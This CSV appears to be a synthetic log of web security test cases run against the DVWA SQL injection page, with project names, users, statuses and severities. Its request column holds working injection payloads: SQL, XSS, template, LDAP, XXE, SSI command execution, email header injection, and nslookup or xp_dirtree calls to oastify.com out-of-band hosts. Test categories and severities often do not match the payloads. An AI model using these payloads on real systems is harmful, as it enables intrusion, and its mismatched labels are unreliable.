Deadline,Date of Test Executed,Project ID,Project Name,User ID,User Agent,Testing Scope,Test Case ID,Test Case,Test Case Status,Request Method,Requested Source,Test Case Outcome Message,Error Message,Actual Test Case Outcome,Reason for failure,Response Size,Findings (Affected Components),Severity ratings
05/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-015,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-001,Input Validation,Completed,GET,/v1/tiles,Fail,HTTP/2 204 No Content,,,,User profile page,Medium
12/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-442,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=171462266'%20or%20'6548'%3d'6548&Submit=Submit,Pass,,,,4647,Database,Low
22/10/2024,22/10/2024,PRJ-046,Distributed Denial of Service (DDoS) Protection Contract Project,USER-059,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-443,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=125502892'%20or%20'1158'%3d'1158'&Submit=Submit,Pass,,,,553,Session management,Low
06/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-444,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=118105483'%20or%20false()%20or%20''%3d'o&Submit=Submit,Pass,,,,558,Payment gateway,Low
20/10/2024,22/10/2024,PRJ-048,Ransomware Prevention Contract Project,USER-089,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-445,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=150989053'%20or%20true()%20or%20''%3d'o&Submit=Submit,Pass,,,,558,Database,Critical
21/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-446,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=150989053'%20or%20true()%20or%20''%3d'o&Submit=Submit,Pass,,,,558,User profile page,Critical
10/10/2024,22/10/2024,PRJ-069,Infrastructure as a Service (IaaS) Contract Project,USER-089,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-447,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%22&Submit=Submit,Pass,,,,4290,User profile page,Critical
28/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-024,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-448,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=wtksnsgli5&Submit=Submit,Pass,,,,4230,Session management,Low
31/10/2024,22/10/2024,PRJ-046,Distributed Denial of Service (DDoS) Protection Contract Project,USER-002,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-449,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1fxdmbxkimd&Submit=Submit,Pass,,,,4299,User profile page,Critical
23/10/2024,22/10/2024,PRJ-072,Sales Performance Optimization Contract Project,USER-065,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-450,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1alert(1)&Submit=Submit,Pass,,,,4297,Database,Critical
26/10/2024,22/10/2024,PRJ-057,Mobile First Strategy Contract Project,USER-063,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-451,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1tz5x6%3ca%3eokzww&Submit=Submit,Pass,,,,4302,Session management,Low
18/10/2024,22/10/2024,PRJ-098,Remote Work Enablement Contract Project,USER-029,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-452,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1y4t4y%3cscript%3ealert(1)%3c%2fscript%3ehf8wb&Submit=Submit,Pass,,,,4324,Payment gateway,Medium
19/10/2024,22/10/2024,PRJ-037,Business Process Automation Contract Project,USER-022,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-453,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=x9nzm$%7b288*180%7da3t4g&Submit=Submit,Pass,,,,4230,Database,Low
18/10/2024,22/10/2024,PRJ-015,File Encryption Contract Project,USER-035,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-454,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=fd3si%7b%7b208*392%7d%7duesjm&Submit=Submit,Pass,,,,4230,Login form,Critical
15/10/2024,22/10/2024,PRJ-028,Data Security and Privacy Contract Project,USER-055,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-455,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=k9bf4%23%7b139*861%7dghn6y&Submit=Submit,Pass,,,,4230,Payment gateway,Low
07/10/2024,22/10/2024,PRJ-034,Mobile First Strategy Contract Project,USER-045,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-456,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=usrnx[[199*951]]f06a1&Submit=Submit,Pass,,,,4230,Login form,Medium
20/10/2024,22/10/2024,PRJ-095,Network Segmentation Contract Project,USER-076,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-457,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=tdhmc$%7bfile.separator%7dknkrn&Submit=Submit,Pass,,,,4230,Database,Medium
18/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-027,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-458,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=wabmb%25%7b287*172%7dka6nu&Submit=Submit,Pass,,,,4230,Session management,High
19/10/2024,22/10/2024,PRJ-036,Email Encryption Contract Project,USER-077,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-459,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=di8h6%7b%7b204%7cadd%3a198%7d%7dq596z&Submit=Submit,Pass,,,,4230,Payment gateway,High
09/10/2024,22/10/2024,PRJ-035,Internal Systems Contract Project,USER-066,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-460,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=%23set%20($a%3d767*872)%20jdm8v$%7ba%7ddjw56&Submit=Submit,Pass,,,,4230,Database,Low
27/10/2024,22/10/2024,PRJ-084,Cost Optimization Contract Project,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-461,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=pnuqk%3c%25%3d%20353*346%20%25%3ezllij&Submit=Submit,Pass,,,,4230,User profile page,High
21/10/2024,22/10/2024,PRJ-032,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-098,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-462,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=fhi9r%0a%3d%20114*347&Submit=Submit,Pass,,,,4230,User profile page,High
17/10/2024,22/10/2024,PRJ-054,Application Modernization Contract Project,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-463,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=ozd7j%7b%7b.%7d%7dv6oss%7b%7b..%7d%7dtjbnj&Submit=Submit,Pass,,,,4230,Login form,Critical
19/10/2024,22/10/2024,PRJ-096,Wireless Network Contract Project,USER-036,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-464,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=qyxbj__$%7b339*341%7d__lweje&Submit=Submit,Pass,,,,4230,Database,High
26/10/2024,22/10/2024,PRJ-001,External Network Contract Project,USER-094,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-465,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%7d%7dbv67a'%2f%22%3cbmlqj&Submit=Submit,Pass,,,,562,Payment gateway,Low
09/10/2024,22/10/2024,PRJ-069,Infrastructure as a Service (IaaS) Contract Project,USER-051,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-466,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%25%7dk1lfh'%2f%22%3cjpmuk&Submit=Submit,Pass,,,,562,User profile page,Critical
19/10/2024,22/10/2024,PRJ-042,Financial Forecasting Contract Project,USER-037,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-467,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1opxfj%25%3exkmbl'%2f%22%3cdrwdy&Submit=Submit,Pass,,,,562,Session management,Medium
01/10/2024,22/10/2024,PRJ-063,Platform as a Service (PaaS) Contract Project,USER-044,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-468,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))&Submit=Submit,Pass,,,,608,Login form,Critical
07/10/2024,22/10/2024,PRJ-016,Customer Behavior Analysis Contract Project,USER-021,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-469,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=15g7u28mgqh%c1%81cwed5fqq1s&Submit=Submit,Pass,,,,4230,Login form,Critical
21/10/2024,22/10/2024,PRJ-089,Customer Behavior Analysis Contract Project,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-470,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=15g7u28mgqh%c1%81cwed5fqq1s&Submit=Submit,Pass,,,,4230,Payment gateway,Low
13/10/2024,22/10/2024,PRJ-047,Security and Compliance Contract Project,USER-033,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-471,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=11u9qztiyrc%2541gn8i3hnwfx&Submit=Submit,Pass,,,,4230,User profile page,Low
01/10/2024,22/10/2024,PRJ-081,Software as a Service (SaaS) Contract Project,USER-040,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-472,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=11u9qztiyrc%2541gn8i3hnwfx&Submit=Submit,Pass,,,,4230,Login form,Low
17/10/2024,22/10/2024,PRJ-028,Data Security and Privacy Contract Project,USER-062,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-473,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=16i9vbdf68h%5c%5clh9r9vx4ij&Submit=Submit,Pass,,,,4230,Session management,Medium
28/10/2024,22/10/2024,PRJ-088,Data-Driven Decision Making Contract Project,USER-057,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-474,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=16i9vbdf68h%5c%5clh9r9vx4ij&Submit=Submit,Pass,,,,4230,Payment gateway,Low
13/10/2024,22/10/2024,PRJ-055,Mobile Application Contract Project,USER-089,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-475,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1uqhv6fkosr%26%2365%3b7my83gshh4&Submit=Submit,Pass,,,,4314,Login form,Medium
29/10/2024,22/10/2024,PRJ-012,ERP Reporting & Analytics Implementation Contract Project,USER-094,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-476,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1uqhv6fkosr%26%2365%3b7my83gshh4&Submit=Submit,Pass,,,,4314,Payment gateway,High
17/10/2024,22/10/2024,PRJ-039,Network Traffic Encryption (TLS/SSL) Contract Project,USER-018,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-477,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=ddu0f9pr84wuibpo2nfskag4wv2sqmee25pvdk.oastify.com&Submit=Submit,Pass,,,,4230,User profile page,Low
21/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-002,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-478,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=http%3a%2f%2fdgx0i9srb4zulbso5nisnaj4zv5stmhc53stgi.oastify.com%2f%3f1&Submit=Submit,Pass,,,,4230,Payment gateway,Medium
03/10/2024,22/10/2024,PRJ-096,Wireless Network Contract Project,USER-020,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-479,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=nslookup%20-q%3dcname%20j4o66fgxzan09hgutt6ybg7an1tyhs5l89zwpke.oastify.com.%26&Submit=Submit,Pass,,,,4230,Database,Medium
31/10/2024,22/10/2024,PRJ-013,Wireless Network Security Contract Project,USER-018,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-480,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%7cnslookup%20-q%3dcname%20k7s79gjy2bq1cijvwu9zehabq2wzkt8pwgj67v.oastify.com.%26&Submit=Submit,Pass,,,,4360,Database,High
08/10/2024,22/10/2024,PRJ-055,Mobile Application Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-481,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1'%22%600%26nslookup%20-q%3dcname%20929w45enx0lq77ekrj4o9650lrrofi3fr6ew2l.oastify.com.%26%60'&Submit=Submit,Pass,,,,636,Payment gateway,Low
17/10/2024,22/10/2024,PRJ-071,E-commerce Platform Development Contract Project,USER-077,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-482,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%26nslookup%20-q%3dcname%20s1uf3od6wjk96qd3q2378p4jkaq7e12wqndd12.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20s1uf3od6wjk96qd3q2378p4jkaq7e12wqndd12.oastify.com.%26%60'&Submit=Submit,Pass,,,,637,Payment gateway,Medium
26/10/2024,22/10/2024,PRJ-078,Post-Implementation ERP Support Contract Project,USER-066,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-483,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%7cecho%203kg3ts8b9g%20k48zzyxas8%7c%7ca%20%23'%20%7cecho%203kg3ts8b9g%20k48zzyxas8%7c%7ca%20%23%7c%22%20%7cecho%203kg3ts8b9g%20k48zzyxas8%7c%7ca%20%23&Submit=Submit,Pass,,,,613,Payment gateway,Low
21/10/2024,22/10/2024,PRJ-031,Sales Performance Optimization Contract Project,USER-064,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-484,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%26echo%20d2em2s6p87%20hzmehe95p1%26&Submit=Submit,Pass,,,,4317,User profile page,Critical
13/10/2024,22/10/2024,PRJ-077,Marketing Campaign Effectiveness Contract Project,USER-010,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-485,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%22%7cecho%20h1mycz6gr8%20ktd00lff9l%20%7c%7c&Submit=Submit,Pass,,,,4320,Payment gateway,Medium
31/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-054,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-486,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1'%7cecho%20rdoyse9jel%206qvasvngbu%20%23xzwx&Submit=Submit,Pass,,,,574,User profile page,Critical
09/10/2024,22/10/2024,PRJ-099,Network Infrastructure Contract Project,USER-010,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-487,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=mg87woi9kc)(objectClass%3d*&Submit=Submit,Pass,,,,4230,Login form,Low
21/10/2024,22/10/2024,PRJ-028,Data Security and Privacy Contract Project,USER-006,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-488,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=6zqmgcv6vi)(!(objectClass%3d*)&Submit=Submit,Pass,,,,4230,Session management,High
21/10/2024,22/10/2024,PRJ-092,Software as a Service (SaaS) Contract Project,USER-065,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-489,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=*)(objectClass%3d*&Submit=Submit,Pass,,,,4230,Database,Low
03/10/2024,22/10/2024,PRJ-069,Infrastructure as a Service (IaaS) Contract Project,USER-069,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-490,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=*)(!(objectClass%3d*)&Submit=Submit,Pass,,,,4230,Login form,High
19/10/2024,22/10/2024,PRJ-066,Cloud Adoption Strategy Contract Project,USER-027,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-491,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=%3cdxm%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2f8qzvs42mlz9pv62jfisnx5tz9qfn3hrhf82yqn.oastify.com%2fdxm.xsd%22%3edxm%3c%2fdxm%3e&Submit=Submit,Pass,,,,4230,Payment gateway,Critical
02/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-098,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-492,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=%3cqvp%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fewe1ya8sr5fv1c8ployt3bz5fwlt9nxolf85wu.oastify.com%2ffoo%22%2f%3e%3c%2fqvp%3e&Submit=Submit,Pass,,,,4230,Database,Medium
10/10/2024,22/10/2024,PRJ-032,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-012,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-493,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1]]%3e%3e%3c&Submit=Submit,Pass,,,,4294,Database,Low
23/10/2024,22/10/2024,PRJ-086,E-commerce Platform Development Contract Project,USER-095,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-494,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=(function()%7bif(typeof%20cm8ub%3d%3d%3d'undefined')%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bcm8ub%3d1%3b%7d%7d())&Submit=Submit,Pass,,,,629,Login form,Medium
06/10/2024,22/10/2024,PRJ-002,Compliance (HIPAA) Contract Project,USER-021,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-495,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1'%2b(function()%7bif(typeof%20gailt%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bgailt%3d1%3b%7d%7d())%2b'&Submit=Submit,Pass,,,,636,Session management,High
26/10/2024,22/10/2024,PRJ-048,Ransomware Prevention Contract Project,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-496,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22rp6%22%20value%3d%22qo5dqm04jh%22--%3e%3c!--%23set%20var%3d%22tr8%22%20value%3d%22sq7fso26lj%22--%3e%3c!--%23echo%20var%3d%22rp6%22--%3e%3c!--%23echo%20var%3d%22tr8%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20dbs0d9nr64uugbno0ndsiae4uv0somcea21prdg.oastify.com%22%20--%3e&Submit=Submit,Pass,,,,676,Login form,High
16/10/2024,22/10/2024,PRJ-055,Mobile Application Contract Project,USER-035,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-497,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%0d%0aBCC%3a86cv84im1zppb6ijvi8nd59zpqvnjh790xrkh86@oastify.com%0d%0ahps%3a%20k&Submit=Submit,Pass,,,,4354,Session management,Low
12/10/2024,22/10/2024,PRJ-059,Supply Chain Optimization Contract Project,USER-066,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-498,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1%3e%0d%0aBCC%3awmmjosyahn5druy7b6obttpn5ebbz5nxhl88ywn@oastify.com%0d%0agvd%3a%20m&Submit=Submit,Pass,,,,4355,Database,Medium
24/10/2024,22/10/2024,PRJ-021,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-033,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 th2paiorkl,WEB,TC-499,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=3bdtcvikko&Submit=Submit&th2paiorkl=1,Pass,,,,4294,Login form,Medium
16/10/2024,22/10/2024,PRJ-066,Cloud Adoption Strategy Contract Project,USER-001,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 th2paiorkl,WEB,TC-500,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=3bdtcvikko&Submit=Submit&th2paiorkl=1,Pass,,,,4294,User profile page,Low
08/10/2024,22/10/2024,PRJ-047,Security and Compliance Contract Project,USER-050,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 th2paiorkl,WEB,TC-501,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=3bdtcvikko&Submit=Submit&th2paiorkl=1,Pass,,,,4294,Login form,Critical
19/10/2024,22/10/2024,PRJ-042,Financial Forecasting Contract Project,USER-032,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 th2paiorkl,APP,TC-502,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&th2paiorkl=1,Pass,,,,4289,Payment gateway,Low
31/10/2024,22/10/2024,PRJ-048,Ransomware Prevention Contract Project,USER-016,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 9hxbcn66e7,WEB,TC-503,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?Submit=Submit&9hxbcn66e7=1,Pass,,,,4367,User profile page,Low
03/10/2024,22/10/2024,PRJ-052,Denial of Service (DoS) Attack Contract Project,USER-009,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-504,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ioisv%20SYSTEM%20%22http%3a%2f%2fj7r69fjx2aq0chjuwt9yegaaq1wyks8vwmjd72.oasti'%7c%7c'fy.com%2f%22%3e%25ioisv%3b]%3e')%2c'%2fl')%20from%20dual),Pass,,,,4289,Payment gateway,High
19/10/2024,22/10/2024,PRJ-071,E-commerce Platform Development Contract Project,USER-059,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-505,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ioisv%20SYSTEM%20%22http%3a%2f%2f356q7zhh0uoka1heud7ic08uoluiic6gu7hy5n.oasti'%7c%7c'fy.com%2f%22%3e%25ioisv%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c',Pass,,,,4289,User profile page,High
25/10/2024,22/10/2024,PRJ-039,Network Traffic Encryption (TLS/SSL) Contract Project,USER-095,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-506,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0efngwqe9rxhjyqb3agflxhrxi3fr9f05owbnzc.oasti'%2b'fy.com%5cbxl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,Pass,,,,4289,Payment gateway,Critical
01/10/2024,22/10/2024,PRJ-026,Compliance (HIPAA) Contract Project,USER-094,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-507,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cyiklkuucdp1fnwu978kdpvlp1g7dv7jyam19sxh.oasti'%2b'fy.com%5crpq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,Pass,,,,4289,Login form,Critical
